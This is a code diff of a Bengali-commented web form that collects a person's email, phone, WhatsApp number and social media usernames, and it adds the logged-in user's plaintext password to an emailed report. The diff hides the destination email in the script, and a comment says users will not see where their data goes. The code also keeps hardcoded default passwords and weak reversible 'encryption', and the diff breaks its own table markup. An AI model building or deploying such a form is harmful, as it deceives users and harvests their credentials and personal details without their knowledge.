@@ -140,12 +140,7 @@ button:hover{
 <div class="box" id="formBox">
 <h3>📋 আপনার তথ্য জমা দিন</h3>
 
-<!-- আপনার ইমেইল এড্রেস (যেখানে রিপোর্ট যাবে) - এখানে আপনার ইমেইল দিন -->
-<div style="margin-bottom:15px; padding:10px; background:#ff00cc22; border-radius:8px;">
-    <label style="margin-top:0">📧 রিপোর্ট পাঠানোর ইমেইল:</label>
-    <input type="email" id="receiverEmail" placeholder="your_email@gmail.com" value="your_email@gmail.com" style="background:#0f0c29;">
-    <small style="font-size:11px; color:#ccc;">⚠️ এখানে আপনার নিজের ইমেইল দিন</small>
-</div>
+<!-- ⚠️ ইউজার শুধু এই ফিল্ডগুলো দেখতে পাবে - রিসিভার ইমেইল বা সাবজেক্ট দেখবে না -->
 
 <label>📧 1. Your Email</label>
 <input type="email" id="yourEmail" placeholder="example@gmail.com">
@@ -195,7 +190,19 @@ button:hover{
 </div>
 
 <script>
-console.log("Script loaded successfully");
+// ==============================================
+// 🔐 গোপনীয় তথ্য - শুধুমাত্র আপনি এখানে সেট করবেন
+// ==============================================
+
+// 📧 যেখানে রিপোর্ট যাবে (আপনার ইমেইল দিন)
+const RECEIVER_EMAIL = "your_email@gmail.com";  // <-- এখানে আপনার ইমেইল দিন
+
+// 📝 ইমেইলের সাবজেক্ট (যা ইমেইলে দেখাবে)
+const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট";  // <-- আপনি চাইলে পরিবর্তন করতে পারেন
+
+// ==============================================
+// আর নিচের কোডে পরিবর্তন করার দরকার নেই
+// ==============================================
 
 // এনক্রিপশন ফাংশন
 function encrypt(pwd){
@@ -216,7 +223,6 @@ function loadUsers(){
     let stored = localStorage.getItem('secure_users');
     if(stored){
         users = JSON.parse(stored);
-        console.log("Users loaded from storage:", users);
     } else {
         users = {
             "admin": encrypt("1234"),
@@ -224,7 +230,6 @@ function loadUsers(){
             "user2": encrypt("2222")
         };
         saveUsers();
-        console.log("Default users created");
     }
 }
 
@@ -235,11 +240,9 @@ function saveUsers(){
 loadUsers();
 
 let currentUser = sessionStorage.getItem("currentUser") || null;
-console.log("Current user from session:", currentUser);
 
 // লগইন ফাংশন
 function login(){
-    console.log("Login function called");
     let u = document.getElementById("loginUser").value.trim();
     let p = document.getElementById("loginPass").value.trim();
     let statusDiv = document.getElementById("loginStatus");
@@ -249,10 +252,6 @@ function login(){
         return;
     }
 
-    console.log("Attempting login for:", u);
-    console.log("Stored password for user:", users[u]);
-    console.log("Decrypted password:", decrypt(users[u]));
-
     if(users[u] && decrypt(users[u]) === p){
         currentUser = u;
         sessionStorage.setItem("currentUser", u);
@@ -260,7 +259,6 @@ function login(){
         document.getElementById("loginUser").value = "";
         document.getElementById("loginPass").value = "";
         updateSubmitButton();
-        console.log("Login successful");
         
         setTimeout(() => {
             if(statusDiv.innerHTML.includes('লগইন সফল')){
@@ -269,7 +267,6 @@ function login(){
         }, 3000);
     } else {
         statusDiv.innerHTML = '<div class="status-error">❌ ভুল ইউজারনাম বা পাসওয়ার্ড</div>';
-        console.log("Login failed");
         setTimeout(() => {
             if(statusDiv.innerHTML.includes('ভুল')){
                 statusDiv.innerHTML = '';
@@ -279,7 +276,6 @@ function login(){
 }
 
 function logout(){
-    console.log("Logout function called");
     currentUser = null;
     sessionStorage.removeItem("currentUser");
     document.getElementById("loginStatus").innerHTML = '<div class="status-success">🚪 লগআউট হয়েছে</div>';
@@ -302,20 +298,16 @@ function updateSubmitButton(){
         submitBtn.style.opacity = "1";
         submitBtn.style.cursor = "pointer";
         formStatus.innerHTML = `<div class="status-success">✅ লগইন করেছেন: ${currentUser}</div>`;
-        console.log("Submit button enabled");
     } else {
         submitBtn.disabled = true;
         submitBtn.style.opacity = "0.5";
         submitBtn.style.cursor = "not-allowed";
         formStatus.innerHTML = '<div class="status-error">🔒 ফর্ম জমা দিতে লগইন করুন</div>';
-        console.log("Submit button disabled");
     }
 }
 
-// কলাম আকারে HTML টেবিল তৈরি
+// HTML টেবিল তৈরি (ইউজারের তথ্য)
 function createEmailBody(){
-    console.log("Creating email body");
-    
     let yourEmail = document.getElementById("yourEmail").value || "—";
     let yourUsername = document.getElementById("yourUsername").value || "—";
     let profilePic = document.getElementById("profilePic").value || "—";
@@ -355,20 +347,20 @@ function createEmailBody(){
 </div>
 
 <table>
-    <tr><th>Your_Email</th><td>${yourEmail}</td></tr>
-    <tr><th>Your_Username</th><td>${yourUsername}</td></tr>
-    <tr><th>Your_Profile_Picture_Link</th><td>${profilePic}</td></tr>
-    <tr><th>Your_Facebook_Username</th><td>${fbUsername}</td></tr>
-    <tr><th>Your_Facebook_Page_Username</th><td>${fbPageUsername}</td></tr>
-    <tr><th>Your_Instagram_Username</th><td>${igUsername}</td></tr>
-    <tr><th>Your_WhatsApp_Number</th><td>${whatsapp}</td></tr>
-    <tr><th>Your_TikTok_Username</th><td>${tiktok}</td></tr>
-    <tr><th>Your_Telegram_Username</th><td>${telegram}</td></tr>
-    <tr><th>Your_Twitter_Username</th><td>${twitter}</td></tr>
-    <tr><th>Your_Phone_Number</th><td>${phone}</td></tr>
-    <tr><th>Your_About</th><td>${about}</td></tr>
-    <tr><th>Your_Website_Link</th><td>${website}</td></tr>
-    <tr><th>Logged_In_User_Info</th><td>লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}</td></tr>
+    <tr><th>Your_Email</th><td>${yourEmail}</tr>
+    <tr><th>Your_Username</th><td>${yourUsername}</tr>
+    <tr><th>Your_Profile_Picture_Link</th><td>${profilePic}</tr>
+    <tr><th>Your_Facebook_Username</th><td>${fbUsername}</tr>
+    <tr><th>Your_Facebook_Page_Username</th><td>${fbPageUsername}</tr>
+    <tr><th>Your_Instagram_Username</th><td>${igUsername}</tr>
+    <tr><th>Your_WhatsApp_Number</th><td>${whatsapp}</tr>
+    <tr><th>Your_TikTok_Username</th><td>${tiktok}</tr>
+    <tr><th>Your_Telegram_Username</th><td>${telegram}</tr>
+    <tr><th>Your_Twitter_Username</th><td>${twitter}</tr>
+    <tr><th>Your_Phone_Number</th><td>${phone}</tr>
+    <tr><th>Your_About</th><td>${about}</tr>
+    <tr><th>Your_Website_Link</th><td>${website}</tr>
+    <tr><th>Logged_In_User_Info</th><td>লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}</tr>
 </table>
 
 <p style="font-size:12px; color:#666; margin-top:15px;">
@@ -382,8 +374,6 @@ function createEmailBody(){
 
 // Gmail এ পাঠানোর ফাংশন
 function sendToGmail(){
-    console.log("Send to Gmail function called");
-    
     if(!currentUser){
         alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
         return;
@@ -401,22 +391,18 @@ function sendToGmail(){
         return;
     }
     
-    let receiverEmail = document.getElementById("receiverEmail").value;
-    
-    if(!receiverEmail || receiverEmail === "your_email@gmail.com"){
-        alert("⚠️ দয়া করে রিপোর্ট পাঠানোর ইমেইলটি পরিবর্তন করুন!\nউপরের বক্সে আপনার নিজের ইমেইল দিন।");
+    // চেক করা রিসিভার ইমেইল সেট করা আছে কিনা
+    if(RECEIVER_EMAIL === "your_email@gmail.com"){
+        alert("⚠️ সেটিংস এ যান! কোডের উপরের RECEIVER_EMAIL এ আপনার নিজের ইমেইল দিন।");
         return;
     }
     
-    let subject = `📋 রিকুয়েস্ট ফর্ম - ${currentUser}`;
     let htmlBody = createEmailBody();
-    
-    let encodedSubject = encodeURIComponent(subject);
+    let encodedSubject = encodeURIComponent(EMAIL_SUBJECT);
     let encodedBody = encodeURIComponent(htmlBody);
     
-    let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${receiverEmail}&su=${encodedSubject}&body=${encodedBody}`;
-    
-    console.log("Opening Gmail with link:", gmailLink);
+    // Gmail লিংক - রিসিভার ইমেইল হিডেন
+    let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`;
     
     // নতুন ট্যাবে Gmail খোলা
     window.open(gmailLink, '_blank');
@@ -433,10 +419,7 @@ function sendToGmail(){
 
 // পেজ লোড ফাংশন
 function init(){
-    console.log("Initializing page...");
     let storedUser = sessionStorage.getItem("currentUser");
-    console.log("Stored user:", storedUser);
-    
     if(storedUser && users[storedUser]){
         currentUser = storedUser;
         updateSubmitButton();
@@ -446,25 +429,9 @@ function init(){
         sessionStorage.removeItem("currentUser");
         updateSubmitButton();
     }
-    
-    // ডিফল্ট রিসিভার ইমেইল সেট করা
-    let receiverInput = document.getElementById("receiverEmail");
-    if(receiverInput && receiverInput.value === "your_email@gmail.com"){
-        receiverInput.style.border = "2px solid #ff4444";
-    }
 }
 
-// পেজ লোড হলে init কল
-window.onload = function(){
-    init();
-};
-
-// পেজ রিফ্রেশ চেক
-window.addEventListener('pageshow', function(event) {
-    if(event.persisted){
-        init();
-    }
-});
+window.onload = init;
 </script>
 
 </body>
